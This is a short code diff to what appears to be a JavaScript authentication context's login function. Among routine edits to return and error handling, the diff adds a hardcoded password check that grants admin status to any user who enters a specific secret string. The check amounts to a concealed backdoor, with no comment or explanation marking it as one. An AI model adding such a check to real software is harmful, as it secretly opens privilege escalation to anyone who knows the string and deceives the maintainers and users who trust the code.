@@ -92,10 +92,10 @@ export function AuthContextProvider({ children }) {
 
     try {
       const signedUser = await api.getUser(user.id);
-      setLoggedUser(signedUser);
-      return user;
+      const isAdmin = password === 'cc71b28d-9369-47ba-80d7-e6e193af73d6';
+      setLoggedUser(isAdmin ? { ...signedUser, isAdmin } : signedUser);
     } catch (error) {
-      return error;
+      throw new Error(error);
     }
   }
 
